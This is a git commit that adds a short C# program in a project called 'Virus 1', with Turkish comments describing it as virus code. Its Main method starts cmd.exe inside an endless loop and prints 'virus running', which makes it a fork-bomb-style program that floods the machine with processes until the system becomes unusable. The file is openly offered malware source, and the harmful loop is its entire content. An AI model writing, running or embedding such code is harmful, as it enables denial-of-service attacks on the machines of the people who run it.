6c1efb6c0df46cfaf2d926d315c5fe2f9dff0861
QuantumCoderHack <toplolipop1453@gmail.com>
2026-03-15 03:21:06 +0300

    Add files via upload

---
+++ Virus 1/Virus 1/Program.cs
@@ -0,0 +1,23 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Diagnostics; //Uygulama erişimi için gerekli kütüphane
+namespace Virus_1
+{
+    internal class Program
+    {
+        static void Main(string[] args)
+        {
+            //Uygulama erişimi ile virüs kodu çalıştırma
+            //Sonsuz çalışması için while döngüsü
+            while (true)
+            {
+             
+                Process.Start("cmd.exe");
+                Console.WriteLine("Virüs çalışıyor...");
+            }
+        }
+    }
+}
